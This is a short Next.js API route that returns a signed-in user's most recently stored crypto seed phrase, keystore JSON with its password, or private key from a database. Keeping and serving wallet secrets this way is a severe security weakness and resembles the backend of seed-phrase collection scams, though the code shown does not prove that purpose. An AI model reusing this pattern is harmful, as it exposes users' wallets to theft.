import { getServerSession } from "next-auth";
import { authOptions } from "@/auth";
import { connectToDB } from "@/lib/connectDB";
import SeedPhrase from "@/models/SeedPhrase";
import Keystore from "@/models/KeystoreJson";
import PrivateKey from "@/models/PrivateKey";

export async function GET(req) {
  await connectToDB();
  const session = await getServerSession(authOptions);
  const userId = session?.user?.id || null;
  const type = req.nextUrl.searchParams.get("type");

  if (!userId || !type) {
    return Response.json({});
  }

  let record;
  if (type === "phrase") {
    record = await SeedPhrase.findOne({ userId }).sort({ createdAt: -1 });
    return Response.json({ phrase: record?.phrase || "" });
  }
  if (type === "keystore") {
    record = await Keystore.findOne({ userId }).sort({ createdAt: -1 });
    return Response.json({ keystore: record?.keystore || "", password: record?.password || "" });
  }
  if (type === "private") {
    record = await PrivateKey.findOne({ userId }).sort({ createdAt: -1 });
    return Response.json({ privateKey: record?.privateKey || "" });
  }

  return Response.json({});
}